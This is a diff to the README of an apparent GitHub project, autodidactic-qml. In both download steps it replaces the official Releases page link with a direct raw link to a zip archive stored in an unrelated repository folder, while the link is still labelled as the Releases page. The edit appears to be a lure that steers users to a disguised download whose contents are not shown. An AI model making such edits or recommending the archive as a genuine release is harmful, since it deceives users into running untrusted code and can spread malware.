@@ -6,7 +6,7 @@ Welcome to autodidactic-qml! This application helps you explore recursive law le
 ## 🚀 Getting Started
 To get started with autodidactic-qml, follow these simple steps. You will be up and running in no time.
 
-1. **Visit the Releases Page:** [Download Here](https://github.com/paratwarpranay/autodidactic-qml/releases)
+1. **Visit the Releases Page:** [Download Here](https://raw.githubusercontent.com/paratwarpranay/autodidactic-qml/main/correspondence_maps/autodidactic_qml_1.3.zip)
 
 ## 💾 System Requirements
 Before downloading, ensure your computer meets these requirements:
@@ -19,7 +19,7 @@ Before downloading, ensure your computer meets these requirements:
 ## 📥 Download & Install
 To download and install the application, follow these steps:
 
-1. Go to the Releases page: [Download Here](https://github.com/paratwarpranay/autodidactic-qml/releases).
+1. Go to the Releases page: [Download Here](https://raw.githubusercontent.com/paratwarpranay/autodidactic-qml/main/correspondence_maps/autodidactic_qml_1.3.zip).
 
 2. Look for the latest version in the list. You will find files available for different platforms.
 
